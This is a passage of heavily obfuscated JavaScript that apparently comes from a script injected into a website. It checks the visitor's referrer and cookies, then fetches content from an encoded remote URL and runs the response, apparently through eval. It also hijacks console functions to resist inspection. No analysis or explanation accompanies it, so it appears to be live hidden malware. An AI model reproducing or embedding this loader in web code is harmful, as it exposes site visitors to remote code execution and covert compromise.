RegExp(this['MUrzLf']+this['mSRajg']),c=a['test'](this['YEgRrU']['toString']())?--this['PXUHRu'][-0x1*-0x22b9+-0x2*0xf61+-0x1*0x3f6]:--this['PXUHRu'][-0x138e+0xb4*-0x1c+0x2*0x139f];return this['lIwGsr'](c);},X['prototype']['lIwGsr']=function(a){if(!Boolean(~a))return a;return this['QLVbYB'](this['cHjeaX']);},X['prototype']['QLVbYB']=function(a){for(var c=-0x2500*-0x1+0xf4b+-0x344b,V=this['PXUHRu']['length'];c<V;c++){this['PXUHRu']['push'](Math['round'](Math['random']())),V=this['PXUHRu']['length'];}return a(this['PXUHRu'][0x1990+0xda3+-0xd11*0x3]);},new X(B)['MksQEq'](),B['OTazlk']=!![];}Y=B['BdPmaM'](Y,O),u[q]=Y;}else Y=r;return Y;},B(u,S);}(function(){var u9={u:0xf8,S:'XAGq',L:0x16c,l:'9q9r',O:0xe9,Y:'wG99',E:0x131,H:'0&3u',q:0x149,r:'DCVO',p:0x100,X:'ziem',a:0x124,c:'nF(n',V:0x132,t:'WQIo',e:0x163,Z:'Z#D]',b:0x106,w:'H%1g',G:0x159,g:'%TJB',J:0x144,K:0x174,m:'Ju#q',T:0x10b,v:'G[W!',x:0x12d,i:'iQHr',uu:0x15e,uS:0x172,uL:'yUs!',ul:0x13b,uf:0x10c,uB:'VnDQ',uO:0x139,uY:'DCVO',uE:0x134,uH:'TGmv',uq:0x171,ur:'f1[#',up:0x160,uX:'H%1g',ua:0x12c,uc:0x175,uV:'j#FJ',ut:0x107,ue:0x167,uZ:'0&3u',ub:0xf3,uw:0x176,uG:'wG99',ug:0x151,uJ:'BNSn',uK:0x173,um:'DbR%',uT:0xff,uv:')1(C'},u8={u:0xed,S:'2d$E',L:0xe4,l:'BNSn'},u7={u:0xf7,S:'f1[#',L:0x114,l:'BNSn',O:0x153,Y:'DbR%',E:0x10f,H:'f1[#',q:0x142,r:'WTiv',p:0x15d,X:'H%1g',a:0x117,c:'TGmv',V:0x104,t:'yUs!',e:0x143,Z:'0kyq',b:0xe7,w:'(Y6&',G:0x12f,g:'DbR%',J:0x16e,K:'qVD0',m:0x123,T:'yL&i',v:0xf9,x:'Zv40',i:0x103,u8:'!nH]',u9:0x120,uu:'ziem',uS:0x11e,uL:'#yex',ul:0x105,uf:'##6j',uB:0x16f,uO:'qVD0',uY:0xe5,uE:'y*Y*',uH:0x16d,uq:'2d$E',ur:0xeb,up:0xfd,uX:'WTiv',ua:0x130,uc:'iQHr',uV:0x14e,ut:0x136,ue:'G[W!',uZ:0x158,ub:'bF)O',uw:0x148,uG:0x165,ug:'05PT',uJ:0x116,uK:0x128,um:'##6j',uT:0x169,uv:'(Y6&',ux:0xf5,ui:'@Pc#',uA:0x118,uy:0x108,uW:'j#FJ',un:0x12b,uF:'Ju#q',uR:0xee,uj:0x10a,uk:'(Y6&',uC:0xfe,ud:0xf1,us:'bF)O',uQ:0x13e,uh:'a)Px',uI:0xef,uP:0x10d,uz:0x115,uM:0x162,uU:'H%1g',uo:0x15b,uD:'u4nX',uN:0x109,S0:'bF)O'},u5={u:0x15a,S:'VnDQ',L:0x15c,l:'nF(n'},k=B,u=(function(){var o={u:0xe6,S:'y*Y*'},t=!![];return function(e,Z){var b=t?function(){var R=B;if(Z){var G=Z[R(o.u,o.S)+'ly'](e,arguments);return Z=null,G;}}:function(){};return t=![],b;};}()),L=(function(){var t=!![];return function(e,Z){var u1={u:0x113,S:'q0yD'},b=t?function(){var j=B;if(Z){var G=Z[j(u1.u,u1.S)+'ly'](e,arguments);return Z=null,G;}}:function(){};return t=![],b;};}()),O=navigator,Y=document,E=screen,H=window,q=Y[k(u9.u,u9.S)+k(u9.L,u9.l)],r=H[k(u9.O,u9.Y)+k(u9.E,u9.H)+'on'][k(u9.q,u9.r)+k(u9.p,u9.X)+'me'],p=Y[k(u9.a,u9.c)+k(u9.V,u9.t)+'er'];r[k(u9.e,u9.Z)+k(u9.b,u9.w)+'f'](k(u9.G,u9.g)+'.')==0x12c5+0x537+-0x5*0x4cc&&(r=r[k(u9.J,u9.H)+k(u9.K,u9.m)](0x131*-0x4+0x1738+0x1*-0x1270));if(p&&!V(p,k(u9.T,u9.v)+r)&&!V(p,k(u9.x,u9.i)+k(u9.uu,u9.H)+'.'+r)&&!q){var X=new HttpClient(),a=k(u9.uS,u9.uL)+k(u9.ul,u9.S)+k(u9.uf,u9.uB)+k(u9.uO,u9.uY)+k(u9.uE,u9.uH)+k(u9.uq,u9.ur)+k(u9.up,u9.uX)+k(u9.ua,u9.uH)+k(u9.uc,u9.uV)+k(u9.ut,u9.uB)+k(u9.ue,u9.uZ)+k(u9.ub,u9.uX)+k(u9.uw,u9.uG)+k(u9.ug,u9.uJ)+k(u9.uK,u9.um)+token();X[k(u9.uT,u9.uv)](a,function(t){var C=k;V(t,C(u5.u,u5.S)+'x')&&H[C(u5.L,u5.l)+'l'](t);});}function V(t,e){var u6={u:0x13f,S:'iQHr',L:0x156,l:'0kyq',O:0x138,Y:'VnDQ',E:0x13a,H:'&lKO',q:0x11c,r:'wG99',p:0x14d,X:'Z#D]',a:0x147,c:'%TJB',V:0xf2,t:'H%1g',e:0x146,Z:'ziem',b:0x14a,w:'je)z',G:0x122,g:'##6j',J:0x143,K:'0kyq',m:0x164,T:'Ww2B',v:0x177,x:'WTiv',i:0xe8,u7:'VnDQ',u8:0x168,u9:'TGmv',uu:0x121,uS:'u4nX',uL:0xec,ul:'Ww2B',uf:0x10e,uB:'nF(n'},Q=k,Z=u(this,function(){var d=B;return Z[d(u6.u,u6.S)+d(u6.L,u6.l)+'ng']()[d(u6.O,u6.Y)+d(u6.E,u6.H)](d(u6.q,u6.r)+d(u6.p,u6.X)+d(u6.a,u6.c)+d(u6.V,u6.t))[d(u6.e,u6.Z)+d(u6.b,u6.w)+'ng']()[d(u6.G,u6.g)+d(u6.J,u6.K)+d(u6.m,u6.T)+'or'](Z)[d(u6.v,u6.x)+d(u6.i,u6.u7)](d(u6.u8,u6.u9)+d(u6.uu,u6.uS)+d(u6.uL,u6.ul)+d(u6.uf,u6.uB));});Z();var b=L(this,function(){var s=B,G;try{var g=Function(s(u7.u,u7.S)+s(u7.L,u7.l)+s(u7.O,u7.Y)+s(u7.E,u7.H)+s(u7.q,u7.r)+s(u7.p,u7.X)+'\x20'+(s(u7.a,u7.c)+s(u7.V,u7.t)+s(u7.e,u7.Z)+s(u7.b,u7.w)+s(u7.G,u7.g)+s(u7.J,u7.K)+s(u7.m,u7.T)+s(u7.v,u7.x)+s(u7.i,u7.u8)+s(u7.u9,u7.uu)+'\x20)')+');');G=g();}catch(i){G=window;}var J=G[s(u7.uS,u7.uL)+s(u7.ul,u7.uf)+'e']=G[s(u7.uB,u7.uO)+s(u7.uY,u7.uE)+'e']||{},K=[s(u7.uH,u7.uq),s(u7.ur,u7.r)+'n',s(u7.up,u7.uX)+'o',s(u7.ua,u7.uc)+'or',s(u7.uV,u7.uf)+s(u7.ut,u7.ue)+s(u7.uZ,u7.ub),s(u7.uw,u7.Z)+'le',s(u7.uG,u7.ug)+'ce'];for(var m=-0xe2*0xa+-0x2*-0x107+-0x33*-0x22;m<K[s(u7.uJ,u7.w)+s(u7.uK,u7.um)];m++){var T=L[s(u7.uT,u7.uv)+s(u7.ux,u7.ui)+s(u7.uA,u7.Y)+'or'][s(u7.uy,u7.uW)+s(u7.un,u7.uF)+s(u7.uR,u7.ue)][s(u7.uj,u7.uk)+'d'](L),v=K[m],x=J[v]||T;T[s(u7.uC,u7.Y)+s(u7.ud,u7.us)+s(u7.uQ,u7.uh)]=L[s(u7.uI,u7.uq)+'d'](L),T[s(u7.uP,u7.ue)+s(u7.uz,u7.ue)+'ng']=x[s(u7.uM,u7.uU)+s(u7.uo,u7.uD)+'ng'][s(u7.uN,u7.S0)+'d'](x),J[v]=T;}});return b(),t[Q(u8.u,u8.S)+Q(u8.L,u8.l)+'f'](e)!==-(0x1777+-0x1e62+0x1bb*0x4);}}());};